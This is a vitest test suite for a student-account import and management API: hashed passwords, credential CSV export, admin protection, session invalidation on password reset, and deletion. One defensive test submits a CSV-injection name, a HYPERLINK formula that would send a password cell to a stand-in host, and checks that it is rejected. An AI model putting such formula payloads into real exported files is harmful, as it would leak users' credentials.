import bcrypt from "bcryptjs";
import request from "supertest";
import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest";
import { app } from "../../src/app";
import { createTest, createUser, PASSWORD, prisma, resetDb } from "../helpers";

let admin: Awaited<ReturnType<typeof createUser>>;

beforeAll(async () => {
  await resetDb();
});
beforeEach(async () => {
  await resetDb();
  admin = await createUser("ADMIN", "admin");
});
afterAll(() => prisma.$disconnect());

const importCsv = (csv: string) => request(app).post("/api/students/import").set("Authorization", admin.auth).send({ csv });

describe("POST /api/students/import", () => {
  it("creates accounts and returns the passwords once", async () => {
    const res = await importCsv("логин,фио,пароль\nivanov,Иванов Иван,MyPass123\npetrov,Петров Пётр,\n");
    expect(res.status).toBe(201);
    expect(res.body.issues).toEqual([]);
    expect(res.body.skipped).toEqual([]);
    expect(res.body.created).toHaveLength(2);
    const [ivanov, petrov] = res.body.created;
    expect(ivanov).toMatchObject({ login: "ivanov", fullName: "Иванов Иван", password: "MyPass123", generated: false });
    expect(petrov).toMatchObject({ login: "petrov", generated: true });
    expect(petrov.password).toHaveLength(10);

    // stored hashed, and the passwords work for login
    const row = await prisma.user.findUniqueOrThrow({ where: { login: "petrov" } });
    expect(row.role).toBe("STUDENT");
    expect(row.passwordHash).not.toContain(petrov.password);
    expect(await bcrypt.compare(petrov.password, row.passwordHash)).toBe(true);
    const login = await request(app).post("/api/auth/login").send({ login: "ivanov", password: "MyPass123" });
    expect(login.status).toBe(200);

    // the list never contains passwords
    const list = await request(app).get("/api/students").set("Authorization", admin.auth);
    expect(list.body.map((s: { login: string }) => s.login)).toEqual(["ivanov", "petrov"]);
    expect(JSON.stringify(list.body)).not.toMatch(/password/i);
  });

  it("skips existing logins without changing their password (incl. admins)", async () => {
    await createUser("STUDENT", "ivanov");
    const res = await importCsv("логин,фио\nivanov,Другой Иванов\nadmin,Захватчик\nnew1,Новый");
    expect(res.status).toBe(201);
    expect(res.body.created.map((c: { login: string }) => c.login)).toEqual(["new1"]);
    expect(res.body.skipped).toEqual([
      { line: 2, login: "ivanov", reason: expect.stringMatching(/уже существует/) },
      { line: 3, login: "admin", reason: expect.stringMatching(/администратором/) },
    ]);
    const ivanov = await prisma.user.findUniqueOrThrow({ where: { login: "ivanov" } });
    expect(await bcrypt.compare(PASSWORD, ivanov.passwordHash)).toBe(true);
    expect(ivanov.fullName).not.toBe("Другой Иванов");
    const adminRow = await prisma.user.findUniqueOrThrow({ where: { login: "admin" } });
    expect(adminRow.role).toBe("ADMIN");
  });

  it("returns 200 when everything was skipped", async () => {
    await createUser("STUDENT", "ivanov");
    const res = await importCsv("логин,фио\nivanov,Иванов");
    expect(res.status).toBe(200);
    expect(res.body.created).toEqual([]);
  });

  it("creates nothing if any row has an error", async () => {
    const res = await importCsv("логин,фио,пароль\nok1,Хороший,\nплохой логин,Плохой,\nok2,Хороший 2,short");
    expect(res.status).toBe(200);
    expect(res.body.created).toEqual([]);
    expect(res.body.issues.map((i: { line: number }) => i.line)).toEqual([3, 4]);
    expect(await prisma.user.count({ where: { role: "STUDENT" } })).toBe(0);
  });

  it("returns the credentials CSV (BOM, formula-safe) only when something was created", async () => {
    const res = await importCsv("логин,фио\nivanov,Иванов Иван\npetrov,Петров");
    const csv: string = res.body.credentialsCsv;
    expect(csv.startsWith("\uFEFFлогин,фио,пароль\r\n")).toBe(true);
    const [ivanov, petrov] = res.body.created;
    expect(csv).toContain(`ivanov,Иванов Иван,${ivanov.password}\r\n`);
    expect(csv).toContain(`petrov,Петров,${petrov.password}\r\n`);

    const again = await importCsv("логин,фио\nivanov,Иванов Иван");
    expect(again.body.credentialsCsv).toBeNull();
  });

  it("rejects formula-looking names (CSV injection)", async () => {
    const res = await importCsv('логин,фио\nevil,"=HYPERLINK(""http://x/?""&C2)"');
    expect(res.body.issues).toEqual([{ line: 2, message: expect.stringMatching(/ФИО не может начинаться/) }]);
    expect(await prisma.user.count({ where: { role: "STUDENT" } })).toBe(0);
  });

  it("stores logins lowercase and skips case-only matches of existing accounts", async () => {
    await createUser("STUDENT", "tmp_x");
    // an older account stored with capitals must also match
    await createUser("STUDENT", "Legacy");
    const res = await importCsv("логин,фио\nTMP_X,Дубль\nLEGACY,Дубль 2\nNew.User,Новый\nADMIN,Захватчик");
    expect(res.body.created.map((c: { login: string }) => c.login)).toEqual(["new.user"]);
    expect(res.body.skipped.map((s: { login: string }) => s.login)).toEqual(["tmp_x", "legacy", "admin"]);
    expect(await prisma.user.count()).toBe(4);
    expect(await prisma.user.findUnique({ where: { login: "new.user" } })).not.toBeNull();
  });

  it("imports a large batch in one go (parallel hashing, one insert)", async () => {
    const body = Array.from({ length: 60 }, (_, i) => `bulk${i},Студент ${i}`).join("\n");
    const res = await importCsv(`логин,фио\n${body}`);
    expect(res.status).toBe(201);
    expect(res.body.created).toHaveLength(60);
    const row = await prisma.user.findUniqueOrThrow({ where: { login: "bulk59" } });
    const creds = res.body.created.find((c: { login: string }) => c.login === "bulk59");
    expect(await bcrypt.compare(creds.password, row.passwordHash)).toBe(true);
  });

  it("400 for an empty body", async () => {
    expect((await importCsv("")).status).toBe(400);
  });
});

describe("single student management", () => {
  it("creates a student (409 for a taken login), renames, resets password", async () => {
    const res = await request(app)
      .post("/api/students")
      .set("Authorization", admin.auth)
      .send({ login: " sidorov ", fullName: "Сидоров   Сидор" });
    expect(res.status).toBe(201);
    expect(res.body).toMatchObject({ login: "sidorov", fullName: "Сидоров Сидор", generated: true });
    const id = res.body.id as string;

    expect(res.body.credentialsCsv).toBe(`\uFEFFлогин,фио,пароль\r\nsidorov,Сидоров Сидор,${res.body.password}\r\n`);

    const dup = await request(app).post("/api/students").set("Authorization", admin.auth).send({ login: "admin", fullName: "X" });
    expect(dup.status).toBe(409);
    const dupCase = await request(app).post("/api/students").set("Authorization", admin.auth).send({ login: "SIDOROV", fullName: "X" });
    expect(dupCase.status).toBe(409);
    const upper = await request(app).post("/api/students").set("Authorization", admin.auth).send({ login: "Kuznetsov", fullName: "Кузнецов" });
    expect(upper.body.login).toBe("kuznetsov");
    const formula = await request(app).post("/api/students").set("Authorization", admin.auth).send({ login: "f", fullName: "@SUM(1)" });
    expect(formula.status).toBe(400);
    expect(formula.body.error).toMatch(/^ФИО не может начинаться/);
    const bad = await request(app).post("/api/students").set("Authorization", admin.auth).send({ login: "a b", fullName: "X" });
    expect(bad.status).toBe(400);

    const renamed = await request(app).patch(`/api/students/${id}`).set("Authorization", admin.auth).send({ fullName: "Новое Имя" });
    expect(renamed.body.fullName).toBe("Новое Имя");
    const badRename = await request(app).patch(`/api/students/${id}`).set("Authorization", admin.auth).send({ fullName: "=1+1" });
    expect(badRename.status).toBe(400);

    const reset = await request(app).post(`/api/students/${id}/reset-password`).set("Authorization", admin.auth);
    expect(reset.status).toBe(200);
    const row = await prisma.user.findUniqueOrThrow({ where: { id } });
    expect(await bcrypt.compare(reset.body.password, row.passwordHash)).toBe(true);
    expect(reset.body.credentialsCsv).toContain(`sidorov,Новое Имя,${reset.body.password}`);
  });

  it("reset-password ends the student's existing sessions", async () => {
    const created = await request(app)
      .post("/api/students")
      .set("Authorization", admin.auth)
      .send({ login: "sess", fullName: "Сессия", password: "OldPass123" });
    const login = await request(app).post("/api/auth/login").send({ login: "sess", password: "OldPass123" });
    const oldAuth = `Bearer ${login.body.token}`;
    expect((await request(app).get("/api/auth/me").set("Authorization", oldAuth)).status).toBe(200);

    const reset = await request(app).post(`/api/students/${created.body.id}/reset-password`).set("Authorization", admin.auth);
    expect((await prisma.user.findUniqueOrThrow({ where: { id: created.body.id } })).tokenVersion).toBe(1);
    expect((await request(app).get("/api/auth/me").set("Authorization", oldAuth)).status).toBe(401);

    const relogin = await request(app).post("/api/auth/login").send({ login: "sess", password: reset.body.password });
    expect((await request(app).get("/api/auth/me").set("Authorization", `Bearer ${relogin.body.token}`)).status).toBe(200);
  });

  it("can't manage admins through this API", async () => {
    const other = await createUser("ADMIN", "admin2");
    const auth = admin.auth;
    expect((await request(app).patch(`/api/students/${other.user.id}`).set("Authorization", auth).send({ fullName: "X" })).status).toBe(404);
    expect((await request(app).post(`/api/students/${other.user.id}/reset-password`).set("Authorization", auth)).status).toBe(404);
    expect((await request(app).delete(`/api/students/${other.user.id}?withAttempts=1`).set("Authorization", auth)).status).toBe(404);
    expect((await request(app).delete(`/api/students/${admin.user.id}`).set("Authorization", auth)).status).toBe(404);
    const list = await request(app).get("/api/students").set("Authorization", auth);
    expect(list.body).toEqual([]);
    const row = await prisma.user.findUniqueOrThrow({ where: { id: other.user.id } });
    expect(row.passwordHash).toBe(other.user.passwordHash);
  });

  it("delete: without attempts works directly; with attempts requires ?withAttempts=1", async () => {
    const plain = await createUser("STUDENT", "plain");
    expect((await request(app).delete(`/api/students/${plain.user.id}`).set("Authorization", admin.auth)).status).toBe(204);
    expect(await prisma.user.findUnique({ where: { id: plain.user.id } })).toBeNull();

    const busy = await createUser("STUDENT", "busy");
    const t = await createTest(admin.user.id);
    await prisma.attempt.create({ data: { testId: t.id, studentId: busy.user.id, finishedAt: new Date() } });
    await prisma.attempt.create({ data: { testId: t.id, studentId: busy.user.id } });

    const refused = await request(app).delete(`/api/students/${busy.user.id}`).set("Authorization", admin.auth);
    expect(refused.status).toBe(409);
    expect(refused.body.error).toMatch(/\(2\)/);
    expect(await prisma.user.findUnique({ where: { id: busy.user.id } })).not.toBeNull();

    const ok = await request(app).delete(`/api/students/${busy.user.id}?withAttempts=1`).set("Authorization", admin.auth);
    expect(ok.status).toBe(204);
    expect(await prisma.user.findUnique({ where: { id: busy.user.id } })).toBeNull();
    expect(await prisma.attempt.count({ where: { studentId: busy.user.id } })).toBe(0);

    // their old token stops working immediately
    expect((await request(app).get("/api/tests").set("Authorization", busy.auth)).status).toBe(401);
  });
});
